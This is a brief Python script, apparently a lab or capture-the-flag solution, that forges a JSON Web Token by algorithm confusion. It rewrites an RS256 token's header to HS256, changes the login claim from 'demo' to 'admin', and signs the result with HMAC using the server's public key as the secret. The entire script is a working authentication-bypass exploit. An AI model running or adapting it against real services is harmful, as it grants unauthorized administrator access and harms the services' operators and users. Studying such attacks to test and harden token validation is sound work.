import hashlib
import hmac
import base64

auth = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsb2dpbiI6ImRlbW8ifQ.abcWIUU4HvocTw1aiP44hjawkr5CUTTjRAb0QCb00l82vJjjs5Nuilm10eQMkGGlleH_99MSMgZZ8xlZksOtVWmcXXflAOm0pLiDhol_Fpnak-BMSUmc9CjtJvFy_0qkmKz8T4QWZ7gG2XjRGcsueNKS-Hx9ExGDlLAGsdmiwMiLzuNeO7iW7ECG9nUrNMpArL3s9cMi-NBiSQQd3DkJLNPZzk2J0Ew-aM3Z744uBH38oNKl4n2ktr4baQMxMIe7pecNLzGgQnZ9UPt-kgzqzPActSK0H4CLhJAekNv3QgOhtJxfeF3e9bMkVx8E4rhTnX4gTqfeu1CX-r1VCtaLdQ"
header, payload, sig = auth.split(".")
header = base64.urlsafe_b64decode(header).decode("utf-8")
payload = base64.urlsafe_b64decode(payload + "==").decode("utf-8")

header = header.replace("RS", "HS").encode("utf-8")
payload = payload.replace("demo", "admin").encode("utf-8")
new_header = base64.urlsafe_b64encode(header).decode("utf-8")
new_payload = base64.urlsafe_b64encode(payload).decode("utf-8")
data = new_header + "." + new_payload
f = open("public.pem")
key = f.read()
# data = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9Cg.eyJsb2dpbiI6ImFkbWluIn0K"
sig = base64.urlsafe_b64encode(hmac.new(bytes(key, encoding="utf-8"), data.encode("utf-8"), hashlib.sha256).digest()).decode("UTF-8").rstrip("=")\
# sig = base64.urlsafe_b64encode(hmac.new(key, data, hashlib.sha256).digest()).decode("utf-8").rstrip("=")
print(data + "." + sig)
